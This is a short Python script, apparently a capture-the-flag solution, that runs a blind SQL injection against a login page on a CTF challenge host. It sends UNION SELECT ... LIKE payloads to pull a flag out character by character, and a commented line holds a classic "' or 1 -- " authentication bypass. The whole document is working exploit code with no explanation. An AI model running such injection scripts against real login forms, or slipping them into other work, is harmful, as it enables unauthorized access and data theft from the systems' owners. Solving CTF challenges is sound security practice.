import requests
import string

url = "http://challenges.ctfd.io:30218/login"
flag = ""
dict = string.printable
while True:
	for i in dict:
		if i == "_" or i == "%":
			password = flag + "\\" + i
		else:
			password = flag + i

		payload = "' UNION SELECT flag, NULL FROM flags WHERE flag LIKE '" + password + "%'; -- "

		#payload = "' or 1 -- "
		r = requests.post(url, data={'username':'mouse', 'password':payload})
		#print(r.text)
		if "Congrats, you logged in!" in r.text:
			flag += i
			break
	print(flag)
	if "}" in flag:
		break